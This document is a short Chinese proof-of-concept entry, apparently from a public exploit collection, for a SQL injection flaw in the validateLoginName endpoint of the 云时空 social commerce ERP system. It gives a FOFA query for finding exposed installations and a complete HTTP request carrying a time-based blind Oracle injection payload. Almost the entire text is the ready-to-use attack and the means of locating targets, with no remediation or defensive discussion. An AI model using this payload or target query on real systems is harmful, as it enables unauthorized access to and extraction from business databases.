## 云时空社会化商业ERP系统validateLoginName接口处存在SQL注入漏洞

## fofa
```
app="云时空社会化商业ERP系统"
```

## poc
```
GET /sys/user/validateLoginName?loginName=admin'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)-- HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![b7009bbcc1323bb5ad48105abc815195](https://github.com/wy876/POC/assets/139549762/56ecb0a8-6e71-467f-8f00-e96e5d8e1969)
